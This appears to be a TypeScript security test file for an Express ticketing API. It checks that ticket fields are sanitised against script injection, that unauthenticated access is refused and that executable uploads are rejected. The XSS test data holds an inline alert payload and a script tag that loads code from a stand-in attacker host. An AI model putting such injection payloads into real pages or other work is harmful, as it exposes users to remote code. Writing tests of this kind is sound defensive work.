import assert from 'assert';
import request from 'supertest';
import { Express } from 'express';

export async function runSecuritySuiteTests(app: Express, adminToken: string, orgId: string) {
  console.log('    • Running Security & Vulnerability Test Suite...');

  // 1. Script injection sanitization check
  const xssRes = await request(app)
    .post('/api/v1/tickets')
    .set('Authorization', `Bearer ${adminToken}`)
    .set('X-Organization-Id', orgId)
    .send({
      title: 'Malicious Script Payload <script>alert("xss")</script>',
      description: 'Clean text body <script src="http://evilhacker.com/malware.js"></script>',
    })
    .expect(201);

  assert.strictEqual(xssRes.body.data.title.includes('<script>'), false);
  assert.strictEqual(xssRes.body.data.description.includes('<script>'), false);

  // 2. Unauthenticated access prevention
  await request(app).get('/api/v1/security/sessions').expect(401);

  // 3. Prohibited Executable Attachment Upload Check
  await request(app)
    .post(`/api/v1/tickets/${xssRes.body.data.id}/attachments`)
    .set('Authorization', `Bearer ${adminToken}`)
    .set('X-Organization-Id', orgId)
    .attach('file', Buffer.from('BINARY_EXEC'), 'malware.exe')
    .expect(400);

  console.log('      ✔ Security & vulnerability test suite passed');
}
